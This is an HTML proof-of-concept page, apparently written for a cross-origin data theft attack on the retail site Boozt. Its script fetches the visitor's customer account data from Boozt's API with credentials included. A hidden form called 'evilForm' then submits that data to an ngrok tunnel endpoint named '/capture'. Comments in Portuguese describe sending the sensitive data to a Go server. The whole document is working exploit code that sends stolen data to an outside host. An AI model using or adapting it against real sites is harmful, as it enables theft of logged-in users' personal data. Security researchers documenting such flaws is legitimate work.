<!DOCTYPE html>
<html>
<body>
    <form id="evilForm" method="POST" action="https://6574-2804-4580-1080-7db-f323-d027-7f53-d143.ngrok-free.app/capture">
        <input type="hidden" name="data">
    </form>

    <script>
        fetch("https://www.boozt.com/at/de-at/api/customer", {
            credentials: "include"
        })
        .then(response => response.text())
        .then(data => {
            // Preenche o campo do formulário com os dados sensíveis
            document.querySelector("input[name=data]").value = data;
            // Envia para o servidor Go
            document.getElementById("evilForm").submit();
        })
        .catch(err => {
            console.error("Erro ao buscar dados da Boozt:", err);
        });
    </script>
</body>
</html>
